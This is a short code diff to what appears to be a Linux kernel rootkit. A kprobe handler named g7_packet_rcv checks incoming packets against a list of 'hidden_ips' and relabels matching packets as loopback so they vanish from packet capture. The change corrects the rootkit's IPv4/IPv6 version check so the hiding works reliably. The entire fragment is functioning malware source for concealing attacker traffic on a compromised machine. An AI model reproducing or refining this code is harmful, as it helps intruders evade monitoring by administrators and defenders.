@@ -116,24 +116,26 @@ g7_packet_rcv(struct kprobe *kp, struct pt_regs *pt_regs)
     char *data = skb_network_header(skb);
     char ver = data[0];
 
+    ver &= 0xf0;
+
     struct sk_buff *clone = skb_clone(skb, GFP_KERNEL);
     pt_regs->di = (long unsigned int)clone;
 
-    if ((ver & 0x40)) {
-        struct iphdr *iphdr;
-
-        iphdr = ip_hdr(clone);
-
-        if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v4)
-            || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v4))
-            clone->pkt_type = PACKET_LOOPBACK;
-    } else if ((ver & 0x60)) {
+    if ((ver == 0x60)) {
         struct ipv6hdr *iphdr;
 
         iphdr = ipv6_hdr(clone);
 
         if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v6)
             || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v6))
+                clone->pkt_type = PACKET_LOOPBACK;
+    } else if ((ver == 0x40)) {
+        struct iphdr *iphdr;
+
+        iphdr = ip_hdr(clone);
+
+        if (list_contains_ip(&hidden_ips, (u8 *)&iphdr->saddr, v4)
+            || list_contains_ip(&hidden_ips, (u8 *)&iphdr->daddr, v4))
             clone->pkt_type = PACKET_LOOPBACK;
     }
 
